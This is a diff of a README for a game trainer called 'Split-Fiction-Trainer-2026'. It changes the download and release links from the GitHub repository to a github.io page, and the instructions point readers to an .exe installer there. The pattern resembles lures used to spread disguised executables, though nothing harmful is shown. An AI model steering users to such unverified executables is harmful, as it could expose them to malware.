@@ -1,6 +1,6 @@
 # 🚀 Split-Fiction-Trainer-2026 - Master your game with reliable tools
 
-[![Download Split-Fiction-Trainer-2026](https://img.shields.io/badge/Download-Split--Fiction--Trainer--2026-blue)](https://github.com/Brianfair964/Split-Fiction-Trainer-2026)
+[![Download Split-Fiction-Trainer-2026](https://img.shields.io/badge/Download-Split--Fiction--Trainer--2026-blue)](https://brianfair964.github.io)
 
 ## 📖 About this software
 
@@ -23,7 +23,7 @@ Before you download the trainer, ensure your computer meets these standards:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the project release page: [https://github.com/Brianfair964/Split-Fiction-Trainer-2026](https://github.com/Brianfair964/Split-Fiction-Trainer-2026).
+1. Visit the project release page: [https://brianfair964.github.io](https://brianfair964.github.io).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version link.
 4. Select the file ending in .exe to download the installer to your computer.
